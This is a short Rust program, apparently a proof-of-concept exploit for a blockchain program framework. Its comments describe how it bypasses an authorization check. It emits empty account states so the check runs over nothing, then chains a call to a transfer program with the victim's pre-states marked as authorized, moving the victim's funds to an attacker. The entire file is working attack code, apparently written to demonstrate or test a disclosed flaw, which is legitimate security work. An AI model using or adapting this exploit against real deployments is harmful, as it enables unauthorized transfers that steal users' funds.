use lee_core::{
    account::AccountId,
    program::{ChainedCall, ProgramInput, ProgramOutput, read_lee_inputs},
};

/// Instruction: (`auth_transfer_id`, `amount`) — `auth_transfer_id` is a dispatch address.
type Instruction = (AccountId, u128);

fn main() {
    let (
        ProgramInput {
            self_account_id,
            caller_account_id,
            pre_states,
            instruction: (simple_transfer_id, amount),
        },
        instruction_data,
    ) = read_lee_inputs::<Instruction>();

    // Output empty pre/post states. P2 processes no accounts itself, so the
    // authorization check at validated_state_diff.rs:158-182 runs over nothing.
    // Victim is never compared against caller_data.authorized_accounts = {attacker}.
    //
    // The bug: authorized_accounts for simple_transfer is built from
    // chained_call.pre_states (this call's inputs, set by P1), which contains
    // victim(is_authorized=true). So authorized_accounts = {victim}, and the
    // subsequent check passes.
    let auth_transfer_instruction = borsh::to_vec(&amount).expect("serialization is infallible");

    ProgramOutput::new(
        self_account_id,
        caller_account_id,
        instruction_data,
        vec![],
        vec![],
    )
    .with_chained_calls(vec![ChainedCall {
        program_account_id: simple_transfer_id,
        pre_states,
        instruction_data: auth_transfer_instruction,
        pda_seeds: vec![],
    }])
    .write();
}
